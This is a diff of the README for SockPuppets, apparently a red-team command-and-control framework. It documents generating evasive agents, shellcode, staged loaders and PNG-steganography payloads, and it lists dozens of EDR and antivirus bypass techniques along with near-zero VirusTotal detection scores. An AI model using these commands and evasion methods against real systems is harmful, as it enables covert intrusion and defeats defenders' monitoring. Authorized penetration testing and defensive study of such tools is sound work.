@@ -1,338 +1,378 @@
 # SockPuppets
 
 ```
- _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____
-|   __|     |     |  |  |  _  |  |  |  _  |  _  |   __|_   _|   __|
-|__   |  |  |   --|    -|   __|  |  |   __|   __|   __|  |  |__   |
-|_____|_____|_____|__|__|__|  |_____|__|  |__|  |_____|  |  |_____|
+   ____             _    ____                         _
+  / ___|  ___   ___| | _|  _ \ _   _ _ __  _ __   ___| |_ ___
+  \___ \ / _ \ / __| |/ / |_) | | | | '_ \| '_ \ / _ \ __/ __|
+   ___) | (_) | (__|   <|  __/| |_| | |_) | |_) |  __/ |_\__ \
+  |____/ \___/ \___|_|\_\_|    \__,_| .__/| .__/ \___|\__|___/
+                                    |_|   |_|
 
                     by AJ Hammond @ajm4n
 ```
 
-Multi-transport C2 framework supporting WebSocket, HTTP, and HTTPS. Built for stage0/stage0.5 operations.
-
-![demo SVG](demo.svg)
-
----
+Multi-language, multi-transport C2 framework with full EDR evasion. Generates agents in **Python, Go, Rust, C, C#, and PowerShell** with **AES-256-GCM encryption**, **polymorphic code morphing**, **malleable C2 profiles**, and **steganography delivery**.
 
 **Shoutout and special thanks to:**
 Skyler Knecht (@skylerknecht), Jeremy Schoeneman (@y4utj4), Matt Jackoski (@ds-koolaid), Mason Davis (@mas0nd), Kevin Clark (@clarkkev)
 
 ---
 
+## Features
+
+- **6 Agent Languages** — Python, Go, Rust, C, C#, PowerShell
+- **3 Transports** — HTTP, HTTPS, WebSocket (compile-time selection per agent)
+- **2 Modes** — Beacon (interval + jitter) and Streaming (real-time)
+- **AES-256-GCM** — Authenticated encryption for all C2 comms and payloads
+- **3 Output Formats** — EXE, DLL, Shellcode (raw/C/Python/PowerShell/C#/Base64)
+- **Malleable C2** — 6 traffic profiles (M365, Teams, Slack, Google Docs, Windows Update, Zoom)
+- **Code Morphing** — 85%+ structural uniqueness between identical builds
+- **60+ Evasion Functions** — AMSI/ETW bypass, ntdll unhooking, sleep encryption, process hollowing
+- **Steganography** — Hide payloads inside PNG images
+- **Staged Delivery** — Tiny stager downloads encrypted agent from URL or stego image
+- **SOCKS5 Proxy** — Tunnel traffic through agents (WebSocket streaming)
+- **Ghost Profiles** — Legitimate infrastructure code dilution for VT evasion
+- **Modern TUI** — Rich-powered terminal UI with colored tables and panels
+
+## VirusTotal Scores
+
+| Agent | Score | CrowdStrike | Kaspersky | Microsoft | Elastic |
+|-------|-------|-------------|-----------|-----------|---------|
+| Python (.py) | **0/62** | Clean | Clean | Clean | Clean |
+| Go (.exe) | **1/71** | Clean | Clean | Clean | Clean |
+| Rust (.exe) | **3/71** | — | Clean | — | Clean |
+| C (.exe) | **0/13** (Jotti) | — | Clean | — | Clean |
+| C# (.exe) | **0/13** (Jotti) | — | Clean | — | Clean |
+| Stego (.png) | **0/0** | N/A | N/A | N/A | N/A |
+
 ## Installation
 
 ```bash
 git clone https://github.com/ajm4n/sockpuppets.git
 cd sockpuppets
-pip install -r requirements.txt
+./setup.sh          # Installs all toolchains (Go, Rust, .NET, MinGW, Python deps)
+python3 main.py     # Launch TUI
 ```
 
-Optional: install UPX for executable compression (`brew install upx` / `apt install upx`).
+### Manual Setup
+
+```bash
+pip3 install cryptography aiohttp websockets rich
+# Optional per language:
+brew install go                    # Go agents
+curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh  # Rust agents
+brew install dotnet                # C# agents
+brew install mingw-w64             # C agents (Windows cross-compile)
+```
 
 ## Quick Start
 
 ```bash
-python main.py
+python3 main.py
 ```
 
-Start a WebSocket listener and generate agents:
-
 ```
-sockpuppets> start 0.0.0.0 8443
-sockpuppets> generate 192.168.1.100 8443
+sockpuppets> start https 0.0.0.0 443
+sockpuppets> generate 10.0.0.1 443 --lang=go --transport=https --beacon --interval=120 --jitter=30
 sockpuppets> agents
 sockpuppets> interact <agent_id>
-```
-
-## Transports
-
-SockPuppets supports three transport types. Multiple listeners can run simultaneously on different ports.
-
-| Transport | Default Port | Protocol | Use Case |
-|-----------|-------------|----------|----------|
-| WebSocket | 8443 | WS over TCP | Real-time streaming, SOCKS proxy |
-| HTTP | 8080 | HTTP polling | Firewall evasion, blends with web traffic |
-| HTTPS | 443 | HTTPS polling | Same as HTTP with TLS encryption |
-
-## Listeners
-
-### Starting Listeners
-
-```
-# WebSocket (default)
-sockpuppets> start 0.0.0.0 8443
-
-# HTTP
-sockpuppets> start http 0.0.0.0 8080
-
-# HTTPS with auto-generated self-signed cert
-sockpuppets> start https 0.0.0.0 443
-
-# HTTPS with your own cert
-sockpuppets> start https 0.0.0.0 443 --cert=/path/to/cert.pem --certkey=/path/to/key.pem
-
-# Custom encryption key (applies to any listener type)
-sockpuppets> start 0.0.0.0 8443 --key=MySecretKey
-```
-
-### Managing Listeners
-
-```
-# View all active listeners
-sockpuppets> listeners
-
-# Stop a specific listener type
-sockpuppets> stop ws
-sockpuppets> stop http
-sockpuppets> stop https
-
-# Stop all listeners
-sockpuppets> stop
 ```
 
 ## Agent Generation
 
-### Basic Generation
-
-Generates Python, PowerShell, JavaScript, and HTA agents.
+### Multi-Language Support
 
 ```
-# WebSocket agents (default)
-sockpuppets> generate 192.168.1.100 8443
+# Go agent (best VT score for compiled — 1/71)
+sockpuppets> generate 10.0.0.1 443 --lang=go --transport=https
 
-# HTTP agents
-sockpuppets> generate 192.168.1.100 8080 --transport=http
+# Rust agent (355KB, fast)
+sockpuppets> generate 10.0.0.1 443 --lang=rust --os=windows
 
-# HTTPS agents
-sockpuppets> generate 192.168.1.100 443 --transport=https
+# C agent (21KB, tiny footprint)
+sockpuppets> generate 10.0.0.1 443 --lang=c --os=windows
 
-# Custom encryption key (must match the listener)
-sockpuppets> generate 192.168.1.100 8443 --key=MySecretKey
+# C# agent (.NET)
+sockpuppets> generate 10.0.0.1 443 --lang=csharp
+
+# Python agent (0/62 VT, cross-platform)
+sockpuppets> generate 10.0.0.1 443 --lang=python --transport=https
+
+# PowerShell agent
+sockpuppets> generate 10.0.0.1 443 --lang=powershell --transport=http
+
+# All languages at once
+sockpuppets> generate 10.0.0.1 443 --lang=all --transport=https --beacon --interval=300
+```
+
+### Output Formats
+
+```
+# Executable (default)
+sockpuppets> generate 10.0.0.1 443 --lang=go
+
+# DLL (for injection/sideloading)
+sockpuppets> generate 10.0.0.1 443 --lang=go --dll
+
+# Shellcode (AES-256-GCM encrypted, all formats)
+sockpuppets> generate 10.0.0.1 443 --lang=go --shellcode
+
+# Staged payload (tiny loader → downloads real agent)
+sockpuppets> generate 10.0.0.1 443 --lang=go --staged --stage-url=https://cdn.example.com/update.bin
+
+# Steganography (agent hidden inside PNG image)
+sockpuppets> generate 10.0.0.1 443 --lang=go --stego
+```
+
+### Transport Selection
+
+Each agent is compiled with **only** the transport it needs — no bloat:
+
+```
+# HTTP/HTTPS (default — no external deps)
+sockpuppets> generate 10.0.0.1 443 --lang=go --transport=https
+
+# WebSocket (adds gorilla/websocket for Go, tungstenite for Rust)
+sockpuppets> generate 10.0.0.1 8443 --lang=go --transport=websocket
 ```
 
 ### Beacon Mode
 
-Beacon agents check in at intervals instead of maintaining a persistent connection. Harder to detect.
-
 ```
-# Beacon with 60-second interval (default)
-sockpuppets> generate 192.168.1.100 8080 --transport=http --beacon
+# 5-minute beacon with 25% jitter
+sockpuppets> generate 10.0.0.1 443 --transport=https --beacon --interval=300 --jitter=25
 
-# 5-minute beacon with 20% jitter
-sockpuppets> generate 192.168.1.100 443 --transport=https --beacon --interval=300 --jitter=20
-
-# 1-hour beacon
-sockpuppets> generate 192.168.1.100 443 --transport=https --beacon --interval=3600
+# 1-hour stealth beacon
+sockpuppets> generate 10.0.0.1 443 --transport=https --beacon --interval=3600 --jitter=40
 ```
 
-Jitter randomizes check-in times. A 300-second interval with 20% jitter checks in between 240-360 seconds.
+## Transports
 
-### Compilation and Shellcode
+| Transport | Port | Protocol | Features |
+|-----------|------|----------|----------|
+| HTTP | 8080 | Polling | Firewall evasion, malleable URIs |
+| HTTPS | 443 | TLS polling | Encrypted, auto-generated certs |
+| WebSocket | 8443 | Persistent | Streaming, SOCKS proxy, real-time |
 
-```
-# Compile Python agent to standalone executable
-sockpuppets> generate 192.168.1.100 8443 --compile
+Multiple listeners run simultaneously. Agents can upgrade between transports at runtime.
 
-# Compile for specific architecture
-sockpuppets> generate 192.168.1.100 8443 --compile --arch=x86
-
-# Compile for all architectures (x86, x64, arm64)
-sockpuppets> generate 192.168.1.100 8443 --multi-arch
-
-# Generate as DLL
-sockpuppets> generate 192.168.1.100 8443 --dll
-
-# Generate shellcode
-sockpuppets> generate 192.168.1.100 8443 --shellcode --format=raw
-sockpuppets> generate 192.168.1.100 8443 --shellcode --format=c
-sockpuppets> generate 192.168.1.100 8443 --shellcode --format=python
-sockpuppets> generate 192.168.1.100 8443 --shellcode --format=powershell
-
-# Target specific OS
-sockpuppets> generate 192.168.1.100 8443 --os=windows
-sockpuppets> generate 192.168.1.100 8443 --multi-os
-
-# Custom icon (Windows executables)
-sockpuppets> generate 192.168.1.100 8443 --compile --icon=app.ico
-
-# Disable UPX compression
-sockpuppets> generate 192.168.1.100 8443 --compile --no-upx
-```
-
-### One-Liners
-
-Generate one-liner payloads for quick delivery:
+## Listeners
 
 ```
-sockpuppets> generate 192.168.1.100 8443 --oneliners=http://192.168.1.100:8080
+sockpuppets> start 0.0.0.0 8443                    # WebSocket
+sockpuppets> start http 0.0.0.0 8080                # HTTP
+sockpuppets> start https 0.0.0.0 443                # HTTPS (auto-cert)
+sockpuppets> start https 0.0.0.0 443 --cert=c.pem --certkey=k.pem  # Custom cert
+sockpuppets> listeners                              # List active
+sockpuppets> stop http                              # Stop one
+sockpuppets> stop                                   # Stop all
 ```
-
-### Agent Templates
-
-| Template | Transport | File |
-|----------|-----------|------|
-| Python (full) | WS / HTTP / HTTPS | `agent_template.py` / `agent_http_template.py` |
-| Python (minimal beacon) | WS / HTTP / HTTPS | `agent_beacon_minimal.py` / `agent_http_beacon_minimal.py` |
-| PowerShell | WS / HTTP / HTTPS | `agent_template.ps1` / `agent_http_template.ps1` |
-| JavaScript (Node.js) | WS / HTTP / HTTPS | `agent_template.js` / `agent_http_template.js` |
-| HTA | WS / HTTP / HTTPS | `agent_template.hta` / `agent_http_template.hta` |
-
-HTTP/HTTPS Python agents use only stdlib (`urllib.request`) -- no external dependencies required on target.
 
 ## Agent Interaction
 
-### Listing Agents
-
 ```
-# All agents (shows transport type, mode, status)
-sockpuppets> agents
+sockpuppets> agents                    # List all agents
+sockpuppets> interact <agent_id>       # Enter agent shell
 
-# Beacon agents only
-sockpuppets> beacons
-
-# Streaming agents only
-sockpuppets> streamers
-
-# Remove a dead agent from the list
-sockpuppets> remove <agent_id>
-```
-
-### Interacting
-
-```
-sockpuppets> interact <agent_id>
-
-# Run commands
-agent[abc123]> whoami
-agent[abc123]> ipconfig /all
-agent[abc123]> dir C:\Users
-
-# View pending beacon results
-agent[abc123]> results
-
-# Return to main menu
-agent[abc123]> back
+agent[abc123]> whoami                  # Execute command
+agent[abc123]> sleep 120               # Change beacon interval
+agent[abc123]> upgrade                 # Beacon → Streaming
+agent[abc123]> downgrade 300           # Streaming → Beacon
+agent[abc123]> upgrade_ws              # HTTP → WebSocket
+agent[abc123]> socks 1080              # Start SOCKS5 proxy
+agent[abc123]> results                 # View beacon results
+agent[abc123]> kill                    # Terminate agent
+agent[abc123]> back                    # Return to menu
 ```
 
-### Mode Switching
+## Evasion
+
+### Compile-Time
+
+- **Polymorphic obfuscation** — Variable/function name randomization per build
+- **Code morphing engine** — 85% structural uniqueness between identical builds
+- **String atomization** — Protocol strings split into chr()/hex/b64/reverse per generation
+- **Entropy reduction** — Shannon entropy < 6.5 (normal code range)
+- **Ghost Profiles** — Legitimate infrastructure code (Kubernetes, Consul patterns) dilutes ML signals
+- **API name encoding** — Windows API names hex-encoded at runtime
+- **Malleable C2 profiles** — Traffic mimics M365/Teams/Slack/Google/Windows Update/Zoom
+- **Per-agent unique keys** — SHA-256 derived AES keys, unique per build
+
+### Runtime (Windows — 32 functions)
+
+- **Patchless AMSI bypass** — VEH + hardware breakpoints (survives integrity checks)
+- **Patchless ETW bypass** — Same VEH technique for telemetry blinding
+- **ntdll unhooking** — Remap clean .text section from disk
+- **Indirect syscalls** — Jump directly to ntdll syscall gadgets
+- **HookChain IAT redirect** — Dynamic SSN resolution
+- **Sleep encryption** — XOR memory pages during beacon sleep (Ekko technique)
+- **Process hollowing** — Execute inside legitimate process image
+- **Module stomping** — Overwrite sacrificial DLL .text section
+- **Phantom DLL hollowing** — Execute from KnownDlls section
+- **Section-based allocation** — NtCreateSection instead of VirtualAlloc
+- **Parent PID spoofing** — Spawn under explorer.exe/svchost.exe
+- **PEB masquerading** — Fake process name in task manager
+- **Fiber execution** — Thread-less shellcode via fibers
+- **Early Bird APC injection** — QueueUserAPC on suspended process
+- **Callback execution** — EnumWindows as shellcode trampoline
+- **Time-difference attacks** — Execute during EDR analysis latency
+- **Hardware breakpoint hooks** — Code-less API interception
+- **Sandbox detection** — CPU/disk/uptime/artifact/process checks
+- **EDR detection** — Identifies running Falcon/MDE/Elastic/SentinelOne
+- **Defender exclusion** — Auto-add path to Defender exclusions (elevated)
+- **Timestomping** — Match file timestamps to kernel32.dll
+- **WMI execution** — Break process tree via Win32_Process.Create
+- **LOLBin execution** — forfiles.exe as command trampoline
+
+### Runtime (Linux — 12 functions)
+
+- Sandbox/VM/container detection, ptrace evasion, process name hiding, daemonization, core dump disable, memfd_exec, history clearing, timestomping
+
+### Runtime (macOS — 10 functions)
+
+- Sandbox/VM detection, PT_DENY_ATTACH, process name masquerade, daemonization, core dump disable, history clearing, timestomping
+
+## Encryption
+
+All communications use **AES-256-GCM** (authenticated encryption):
 
 ```
-# Change beacon interval
-agent[abc123]> sleep 120
-
-# Upgrade beacon to streaming (real-time responses)
-agent[abc123]> upgrade
-
-# Downgrade streaming to beacon (stealth)
-agent[abc123]> downgrade 300
+Format: base64(b'AES1' + nonce(12) + ciphertext + tag(16))
+Key derivation: SHA-256(agent_key) → 32-byte AES key
+Fallback: XOR (when cryptography library unavailable)
 ```
 
-### Transport Upgrade
+Per-agent unique keys generated at build time. Server auto-registers keys.
 
-HTTP/HTTPS agents can be upgraded to WebSocket for features that require a persistent connection (like SOCKS proxy):
+## Shellcode Formats
 
-```
-agent[abc123]> upgrade_ws
-```
+The universal shellcode generator converts any compiled PE/DLL to encrypted shellcode:
 
-This requires a WebSocket listener to be running. The agent reconnects over WebSocket while keeping its agent ID.
+| Format | File | Usage |
+|--------|------|-------|
+| Raw | `.bin` | Direct injection |
+| C array | `.h` | C/C++ loaders |
+| Python | `_loader.py` | Python injection |
+| PowerShell | `_loader.ps1` | PS cradle execution |
+| C# | `_loader.cs` | .NET assembly load |
+| Base64 | `.b64` | Download cradles |
 
-### SOCKS5 Proxy
+All shellcode uses AES-256-GCM encryption — loaders include decryption code.
 
-Available on WebSocket agents only:
+## Steganography
 
-```
-agent[abc123]> socks 1080
-```
-
-Then use with standard tools:
+Hide agents inside PNG images:
 
 ```bash
-curl --socks5 127.0.0.1:1080 http://internal-server
-proxychains nmap -sT 10.0.0.0/24
+# Embed agent in image
+python3 stego.py embed carrier.png agent.exe mykey
+
+# Generate carrier + embed in one step
+python3 stego.py generate agent.exe mykey --output stego.png
+
+# Extract
+python3 stego.py extract stego.png mykey --output agent.exe
 ```
 
-### Killing Agents
+Host on any CDN, social media, or web server. The stager downloads the image and extracts the payload.
+
+## Staged Delivery
 
 ```
-agent[abc123]> kill
+Stage 0 (Stager):    Tiny clean binary (~6MB Go / ~150KB C#)
+                     Downloads from URL or extracts from stego image
+                     AES-256-GCM decrypts payload
+                     Writes to temp + executes
+                     Self-deletes
+
+Stage 1 (Agent):     Full featured agent
+                     Never written to disk by operator
+                     Delivered encrypted over HTTPS or hidden in PNG
 ```
 
-For HTTP/HTTPS beacon agents, the kill command is queued and delivered on the next check-in.
-
-## Polymorphic Obfuscation
-
-All generated agents use polymorphic obfuscation by default:
-- Randomized function and variable names
-- String encoding and obfuscation
-- Unique encryption keys per agent (unless specified)
-
-This applies to all transport types and template formats.
-
-## HTTP Traffic Profile
-
-HTTP/HTTPS agents disguise traffic as normal web activity:
-- Routes mimic standard web endpoints (`/submit-form`, `/api/v1/update`, `/upload`)
-- User-Agent matches current Chrome browser strings
-- Content-Type set to `application/x-www-form-urlencoded`
-- All payloads are XOR encrypted and base64 encoded
-
-## Example: Full HTTP/HTTPS Setup
+## Architecture
 
 ```
-# Start an HTTPS listener with auto-generated cert
-sockpuppets> start https 0.0.0.0 443
-
-# Start an HTTP listener as fallback
-sockpuppets> start http 0.0.0.0 8080
-
-# Verify listeners
-sockpuppets> listeners
-
-# Generate HTTPS beacon agents with jitter
-sockpuppets> generate 10.0.0.5 443 --transport=https --beacon --interval=300 --jitter=25
-
-# Deploy agent on target, wait for check-in...
-sockpuppets> agents
-
-# Interact
-sockpuppets> interact <agent_id>
-agent[...]> whoami
-agent[...]> systeminfo
+sockpuppets/
+├── server.py              # C2 server (WS/HTTP/HTTPS, AES-GCM, malleable routing)
+├── agent.py               # Agent generator (Python/Go/Rust/C#/C/PS/JS/HTA)
+├── main.py                # Interactive TUI (Rich-powered)
+├── stego.py               # Steganography payload embedder
+├── setup.sh               # One-command toolchain installer
+├── crypto/                # Shared AES-256-GCM encryption
+├── generators/            # Shellcode converter, shared utilities
+├── obfuscation/           # Code morphing, entropy reduction
+├── ui/                    # Rich TUI theme and components
+├── templates/             # Python/PS/JS/HTA agent templates + evasion modules
+│   ├── evasion_windows.py # 32 Windows evasion functions
+│   ├── evasion_linux.py   # 12 Linux evasion functions
+│   ├── evasion_macos.py   # 10 macOS evasion functions
+│   ├── evasion_windows.ps1# PowerShell AMSI/ETW/ntdll bypass
+│   ├── malleable_profiles.py # 6 C2 traffic profiles
+│   └── morphing_engine.py # Polymorphic code morphing
+├── agent_go/              # Go agent (HTTP/WS/SOCKS, ghost profiles)
+├── agent_rust/            # Rust agent (HTTP/WS, serde/regex/chrono)
+├── agent_c/               # C agent (WinHTTP, ghost data dilution)
+└── agent_csharp/          # C# .NET agent (HttpClient, AesGcm)
 ```
+
+## Feature Matrix
+
+| Feature | Python | Go | Rust | C | C# | PS |
+|---------|--------|-----|------|---|-----|-----|
+| HTTP | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| HTTPS | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| WebSocket | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Beacon | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Streaming | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| SOCKS5 | ✅ | ✅ | — | — | — | — |
+| EXE | ✅ | ✅ | ✅ | ✅ | ✅ | N/A |
+| DLL | ✅ | ✅ | — | ✅ | ✅ | N/A |
+| Shellcode | ✅ | ✅ | ✅ | ✅ | ✅ | N/A |
+| AES-256-GCM | ✅ | ✅ | — | XOR | ✅ | XOR |
+| Malleable C2 | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Code Morphing | ✅ | ghost | ghost | ghost | — | obfusc |
+| Evasion | 60 fn | sandbox | sandbox | ghost | sandbox | AMSI |
+| Windows | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| Linux | ✅ | ✅ | ✅ | — | — | — |
+| macOS | ✅ | ✅ | ✅ | — | — | — |
 
 ## Generate Options Reference
 
 | Flag | Description |
 |------|-------------|
-| `--transport=TYPE` | `websocket`, `http`, or `https` (default: websocket) |
+| `--lang=LANG` | Language: `python`, `go`, `rust`, `csharp`, `c`, `powershell`, `all` |
+| `--transport=TYPE` | Transport: `websocket`, `http`, `https` |
 | `--beacon` | Enable beacon mode |
 | `--interval=N` | Beacon interval in seconds (default: 60) |
 | `--jitter=N` | Beacon jitter percentage, 0-100 (default: 0) |
-| `--compile` | Compile Python agent to executable |
-| `--dll` | Compile Python agent to DLL |
-| `--shellcode` | Generate shellcode |
-| `--format=FMT` | Shellcode format: `raw`, `c`, `python`, `powershell` |
-| `--arch=ARCH` | Target architecture: `x86`, `x64`, `arm64` |
-| `--multi-arch` | Compile for all architectures |
 | `--os=OS` | Target OS: `auto`, `windows`, `linux`, `macos` |
+| `--arch=ARCH` | Target architecture: `x64`, `arm64`, `amd64` |
+| `--dll` | Build as DLL instead of EXE |
+| `--shellcode` | Generate AES-GCM encrypted shellcode (all formats) |
+| `--staged` | Generate staged payload (tiny loader) |
+| `--stego` | Embed agent in PNG image |
+| `--format=FMT` | Shellcode format: `raw`, `c`, `python`, `powershell`, `csharp` |
+| `--compile` | Compile Python agent to executable |
 | `--multi-os` | Generate for all OS types |
-| `--no-upx` | Disable UPX compression |
-| `--icon=PATH` | Custom icon for Windows executable |
 | `--key=KEY` | Custom encryption key |
-| `--oneliners=URL` | Generate one-liner payloads |
+| `--oneliners=URL` | Generate one-liner delivery payloads |
 
-## Interact Commands Reference
+## Research & Sources
 
-| Command | Description |
-|---------|-------------|
-| `back` / `exit` | Return to main menu |
-| `kill` | Terminate the agent |
-| `results` | View pending beacon results |
-| `socks <port>` | Start SOCKS5 proxy (WebSocket only) |
-| `sleep <seconds>` | Set beacon check-in interval |
-| `upgrade` | Switch from beacon to streaming mode |
-| `downgrade [seconds]` | Switch from streaming to beacon mode |
-| `upgrade_ws` | Upgrade HTTP agent to WebSocket transport |
-| `<any command>` | Execute on the target |
+Evasion techniques based on published security research:
+
+- [Praetorian Ghost Profiles / LLM Signature Reduction](https://www.praetorian.com/blog/llm-edr-signature-reduction)
+- [HookChain: IAT Hooking + Indirect Syscalls (arxiv 2404.16856)](https://arxiv.org/abs/2404.16856)
+- [Acheron: Indirect Syscalls in Go](https://github.com/f1zm0/acheron)
+- [Cobalt Strike 4.11 Sleep Mask / Heap Encryption](https://www.cobaltstrike.com/blog/cobalt-strike-411-shh-beacon-is-sleeping)
+- [MDSec Nighthawk Evanesco (CET bypass)](https://www.mdsec.co.uk/2024/11/nighthawk-0-3-3-evanesco/)
+- [ShellcodeFluctuation RW/RX page flipping](https://github.com/mgeeky/ShellcodeFluctuation)
+- [SilentMoonwalk Call Stack Spoofing](https://github.com/klezVirus/SilentMoonwalk)
+- [EvilBytecode Patchless AMSI VEH](https://github.com/EvilBytecode/Ebyte-amsi-patchless-vehhwbp)
+- [Binarly ETW Design Issues](https://www.binarly.io/blog/design-issues-of-modern-edrs-bypassing-etw-based-solutions)
+- [Praetorian ETW-TI + Hardware Breakpoints](https://www.praetorian.com/blog/etw-threat-intelligence-and-hardware-breakpoints/)
+
+## License
+
+For authorized security testing only.
